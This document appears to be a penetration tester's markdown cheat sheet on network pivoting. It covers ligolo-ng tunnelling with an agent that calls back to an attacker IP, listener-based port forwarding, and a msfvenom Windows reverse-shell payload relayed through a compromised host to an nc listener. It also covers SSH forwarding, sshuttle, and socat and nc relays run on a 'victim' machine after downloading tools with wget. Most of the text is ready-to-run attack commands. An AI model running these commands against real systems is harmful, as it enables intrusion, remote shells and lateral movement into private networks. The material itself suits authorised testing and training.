
**Ligolo-ng** 

 allows pentesters to establish tunnels from a reverse TCP/TLS connection using a **tun interface**

install  proxy
https://github.com/nicocha30/ligolo-ng/releases

```sh
sudo ip tuntap add user kali mode tun ligolo

sudo ip link set ligolo up



#80 and 443 are excellent choices because they are commonly allowed by firewalls and appear less suspicious due to their frequent use in legitimate web traffic
./proxy -selfcert -laddr 0.0.0.0:<proxy_port>
```

use for the Client 
https://github.com/nicocha30/ligolo-ng/releases


```sh
./agent.exe -connect <attacker_IP>:<ligolo_port> -retry -ignore-cert

#routing setup
#Represents the subnet of the internal network you want to route traffic 10.10.10.0/24
sudo ip route add <internal_subnet> dev ligolo

#select session
session <session_ID>
#starting the session as the user we set the agent.exe for 
start
```

Port Forwarding 

```sh
 #list all the address that port forwarded
listener_list

#redirect  conncetion from agent to kali
listener_add --addr 0.0.0.0:1235 --to locahost:80


############################################################3
we can use this as file transfer from kali we open python server on port 80 and on lets say ms2 is linked to ms1 which is central point between them we use port 1235 to connect or curl from  ms2 we can download upload data using http://ms1:1235/ that we will take data from kali

#scenario 2

listener_add --addr 0.0.0.0:4444 --to locahost:443

msfvenom  -p windows/x64/shell_reverse_tcp LHOST=ms1 LPORT=4444 -f exe -o winrev444.exe 

upload it to ms2

now on kali  run nc -lvnp 443

we now have a reverse shell connected from ms2 to our kali passing / forwarding it though ms1
 
```
## SSH Port Forwarding

Specific port forwarding 
```
ssh -L <local_port>:<target_host>:<target_port> <user>@<ip>
```

dynamic port
```sh
ssh <user>@<ip> -D <target_port>
```

Can be scanned like so :

```
nmap -v -sV -p1234 localhost
```

## Sshuttle

SSH pivoting
```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

```
sshuttle -r root@10.200.98.200 --ssh-cmd "ssh -i key.rsa" 10.200.98.0/24 -x 10.200.98.200 &
```


# SOCAT

Port forward from machine to external netwrok
```sh
wget http://precompiled/socat -O /tmp/socat
chmod +x /tmp/socat

#forward from victim port 8000 to external network
socat tcp-l:2345,fork tcp:127.0.0.1:8000 &

#not victim IP + port 2345 is exporsed to external networks


```


# NC

```sh

# Forward  port (8000) to your attacker machine
#victim
mkfifo /tmp/jdwp_fifo
nc -l -p 9000 < /tmp/jdwp_fifo | nc 127.0.0.1 8000 > /tmp/jdwp_fifo &

#attacker
nc -lvnp 1234

```
### References 

https://github.com/nicocha30/ligolo-ng/releases
